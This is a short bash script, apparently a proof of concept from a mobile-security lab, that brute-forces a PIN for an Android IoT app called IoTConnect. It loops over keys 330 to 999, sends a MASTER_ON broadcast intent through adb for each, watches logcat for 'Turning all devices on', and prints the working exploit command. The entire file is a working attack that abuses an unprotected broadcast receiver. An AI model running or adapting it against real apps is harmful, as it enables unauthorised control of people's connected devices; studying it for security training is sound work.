#!/bin/bash

# Brute IoTConnect
# Author: Parad0x_0xff
# Date: 2024-07-29

PID=$(adb shell ps |grep iot |awk '{print $2}')

adb logcat -c


for x in $(seq 330 999); #changed the range to be faster PoC only
do 
	echo "$x";adb shell am broadcast -a MASTER_ON --ei key "$x";
	if adb logcat --pid=$PID -d|grep -q "Turning all devices on";
	then 
		echo "PIN Found: $x";
		break; 
	fi
done

echo "The command to exploit the IoTConnect is: adb shell am broadcast -a MASTER_ON --ei key $x"

